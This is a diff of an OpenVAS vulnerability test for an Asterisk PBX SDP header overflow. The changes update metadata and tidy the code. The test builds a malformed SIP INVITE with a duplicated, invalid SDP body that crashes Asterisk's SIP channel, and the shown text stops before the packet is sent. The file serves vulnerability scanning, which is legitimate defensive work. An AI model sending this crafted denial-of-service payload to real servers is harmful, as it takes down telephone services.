@@ -1,14 +1,14 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: asterisk_sdp_header_overflow.nasl 4887 2016-12-30 12:54:28Z cfi $
+# $Id: asterisk_sdp_header_overflow.nasl 14010 2019-03-06 08:24:33Z cfischer $
 #
 # Asterisk PBX SDP Header Overflow Vulnerability
 #
 # Authors:
-# Ferdy Riphagen 
+# Ferdy Riphagen
 #
 # Copyright:
-# Copyright (C) 2007 Ferdy Riphagen
+# Copyright (C) 2008 Ferdy Riphagen
 #
 # This program is free software; you can redistribute it and/or modify
 # it under the terms of the GNU General Public License version 2,
@@ -24,13 +24,13 @@
 # Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
 ###############################################################################
 
-CPE = 'cpe:/a:digium:asterisk';
+CPE = "cpe:/a:digium:asterisk";
 
 # Note :
-# Because probably many systems running safe_asterisk 
+# Because probably many systems running safe_asterisk
 # as a watchdog for the asterisk pid, this check could
-# be very false-negative prone. Additionally an INVITE 
-# message on secure systems need authentication, so this 
+# be very false-negative prone. Additionally an INVITE
+# message on secure systems need authentication, so this
 # only works on systems using 'allowguest=yes' in sip.conf
 # and for peers without authentication info with the use
 # of an edited 'logins.nasl' (not supplied).
@@ -38,8 +38,8 @@ CPE = 'cpe:/a:digium:asterisk';
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.9999992");
-  script_version("$Revision: 4887 $");
-  script_tag(name:"last_modification", value:"$Date: 2016-12-30 13:54:28 +0100 (Fri, 30 Dec 2016) $");
+  script_version("$Revision: 14010 $");
+  script_tag(name:"last_modification", value:"$Date: 2019-03-06 09:24:33 +0100 (Wed, 06 Mar 2019) $");
   script_tag(name:"creation_date", value:"2008-08-22 16:09:14 +0200 (Fri, 22 Aug 2008)");
   script_tag(name:"cvss_base", value:"7.8");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
@@ -48,7 +48,7 @@ if(description)
   script_name("Asterisk PBX SDP Header Overflow Vulnerability");
   script_category(ACT_DENIAL);
   script_family("Denial of Service");
-  script_copyright("This script is Copyright (C) 2007 Ferdy Riphagen");
+  script_copyright("This script is Copyright (C) 2008 Ferdy Riphagen");
   script_dependencies("secpod_asterisk_detect.nasl", "logins.nasl");
   script_mandatory_keys("Asterisk-PBX/Installed");
 
@@ -56,11 +56,8 @@ if(description)
   script_xref(name:"URL", value:"http://bugs.digium.com/view.php?id=9321");
 
   script_tag(name:"solution", value:"Upgrade to Asterisk release 1.4.2/1.2.17 or newer.");
-  script_tag(name:"summary", value:"The remote SIP server is affected by an overflow vulnerability. 
 
-  Description :
-
-  A version of Asterisk PBX is running on the remote host. Asterisk is a complete open-source VoIP system.");
+  script_tag(name:"summary", value:"The remote Asterisk PBX SIP server is affected by an overflow vulnerability.");
 
   script_tag(name:"impact", value:"This results in a Segmentation fault in 'chan_sip.c' crashing the Asterisk PBX service.");
 
@@ -77,32 +74,42 @@ if(description)
 
 include("sip.inc");
 include("host_details.inc");
+include("misc_func.inc");
 
-if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
-if( ! infos = get_app_location_and_proto( cpe:CPE, port:port ) ) exit( 0 );
+if( ! port = get_app_port( cpe:CPE ) )
+  exit( 0 );
+
+if( ! infos = get_app_location_and_proto( cpe:CPE, port:port ) )
+  exit( 0 );
 
 proto = infos["proto"];
 
-if( ! sip_alive( port:port, proto:proto ) ) exit( 0 );
+if( ! sip_alive( port:port, proto:proto ) )
+  exit( 0 );
+
+targethost = get_host_name();
+thishost = this_host();
+vtstrings = get_vt_strings();
+user = vtstrings["lowercase"];
 
 sdp_headers = string(
     "v=0\r\n",
-    "o=somehost 12345 12345 IN IP4 ", get_host_name(), "\r\n",
-    "c=IN IP4 ", get_host_name(), "\r\n",
+    "o=somehost 12345 12345 IN IP4 ", targethost, "\r\n",
+    "c=IN IP4 ", targethost, "\r\n",
     "m=audio 16384 RTP/AVP 8 0 18 101\r\n\r\n",
     "v=1\r\n",
-    "o=somehost 12345 12345 IN IP4 ", get_host_name(), "\r\n",
+    "o=somehost 12345 12345 IN IP4 ", targethost, "\r\n",
     "c=IN IP4 555.x.555.x.555\r\n",
     "m=audio 16384 RTP/AVP 8 0 18 101");
 
 bad_invite = string(
-    "INVITE sip:", get_host_name(), "\r\n",
-    "Via: SIP/2.0/", toupper( proto ), " ", this_host(), ":", port, "\r\n",
-    "To: <sip:", get_host_name(), ":", port, ">\r\n",
-    "From: <sip:openvas", this_host(), ":", port, ">\r\n",
+    "INVITE sip:", targethost, "\r\n",
+    "Via: SIP/2.0/", toupper( proto ), " ", thishost, ":", port, "\r\n",
+    "To: <sip:", user, "@", targethost, ":", port, ">\r\n",
+    "From: <sip:", user, "@", thishost, ":", port, ">\r\n",
     "Call-ID: ", rand(), "\r\n",
     "CSeq: ", rand(), " INVITE\r\n",
-    "Contact: <sip:openvas", this_host(), ">\r\n",
+    "Contact: <sip:", user, "@", thishost, ">\r\n",
     "Max-Forwards: 0\r\n",
     "Content-Type: application/sdp\r\n",
     "Content-Length: ", strlen(sdp_headers), "\r\n\r\n",
